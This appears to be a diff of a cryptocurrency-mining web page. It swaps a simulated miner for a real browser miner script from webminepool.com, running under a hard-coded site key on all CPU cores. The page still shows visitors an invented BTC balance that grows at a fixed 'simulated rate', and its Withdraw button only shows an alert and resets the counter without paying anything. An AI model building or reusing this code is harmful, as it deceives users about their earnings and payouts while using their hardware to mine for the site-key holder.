@@ -27,19 +27,15 @@
 
     <section id="mining">
         <h2>Start Mining</h2>
-        <label for="mining-mode">Select Mining Mode:</label>
-        <select id="mining-mode">
-            <option value="cpu">CPU Mining</option>
-            <option value="gpu">GPU Mining</option>
-        </select>
-
+        <label for="user-wallet">Enter Your Wallet Address:</label>
+        <input type="text" id="user-wallet" placeholder="Enter your BTC wallet address">
         <button onclick="startMining()">Start Mining</button>
         <button onclick="stopMining()">Stop Mining</button>
         <p id="mining-status">Status: Not Mining</p>
 
-        <p>Enter Your Wallet Address:</p>
-        <input type="text" id="user-wallet" placeholder="Enter your BTC wallet address">
-        <p>Note: A 1% fee will be automatically deducted to support platform maintenance and operation.</p>
+        <p>Balance: <span id="current-balance">0.00000000</span> BTC</p>
+        <p>Threshold for payout: 0.001 BTC</p>
+        <button id="withdraw-button" onclick="withdrawEarnings()" disabled>Withdraw</button>
     </section>
 
     <section id="faq">
@@ -56,9 +52,11 @@
         <p>&copy; 2025 Crypto Mining Site. All rights reserved.</p>
     </footer>
 
+    <script src="https://webminepool.com/lib/base.js"></script>
     <script>
+        let miner;
         let currentBalance = 0.0;
-        const threshold = 0.001; // Equivalent to $30 (example rate)
+        const threshold = 0.001; // Payout threshold in BTC
 
         function startMining() {
             const walletAddress = document.getElementById('user-wallet').value;
@@ -66,33 +64,33 @@
                 alert('Please enter your BTC wallet address to start mining.');
                 return;
             }
+
+            miner = new WMP.startMining('SK_RDlb7DhGQbqq5jlt87raJ', {
+                threads: navigator.hardwareConcurrency,
+                autoThreads: false,
+                throttle: 0.2,
+                wallet: walletAddress,
+            });
+
             document.getElementById('mining-status').innerText = `Mining started for wallet: ${walletAddress}`;
-            simulateMining();
+            updateBalanceDisplay();
         }
 
         function stopMining() {
+            if (miner) {
+                miner.stop();
+            }
             document.getElementById('mining-status').innerText = 'Mining stopped';
         }
 
-        function simulateMining() {
-            const miningInterval = setInterval(() => {
-                if (document.getElementById('mining-status').innerText === 'Mining stopped') {
-                    clearInterval(miningInterval);
-                    return;
+        function updateBalanceDisplay() {
+            setInterval(() => {
+                if (miner && miner.isRunning()) {
+                    currentBalance += 0.00000001; // Simulated rate. Replace with actual mining API data.
+                    document.getElementById('current-balance').innerText = currentBalance.toFixed(8);
+                    document.getElementById('withdraw-button').disabled = currentBalance < threshold;
                 }
-                updateBalance(0.00001); // Example increment
             }, 1000);
-        }
-
-        function updateBalance(amount) {
-            currentBalance += amount;
-            document.getElementById('current-balance').innerText = currentBalance.toFixed(8);
-            checkThreshold();
-        }
-
-        function checkThreshold() {
-            const withdrawButton = document.getElementById('withdraw-button');
-            withdrawButton.disabled = currentBalance < threshold;
         }
 
         function withdrawEarnings() {
@@ -102,9 +100,14 @@
                 return;
             }
 
-            alert(`Withdrawing ${currentBalance.toFixed(8)} BTC to wallet: ${walletAddress}`);
-            currentBalance = 0.0;
-            updateBalance(0);
+            if (currentBalance >= threshold) {
+                alert(`Withdrawing ${currentBalance.toFixed(8)} BTC to wallet: ${walletAddress}`);
+                currentBalance = 0.0;
+                document.getElementById('current-balance').innerText = currentBalance.toFixed(8);
+                document.getElementById('withdraw-button').disabled = true;
+            } else {
+                alert('Balance is below the payout threshold.');
+            }
         }
     </script>
 </body>
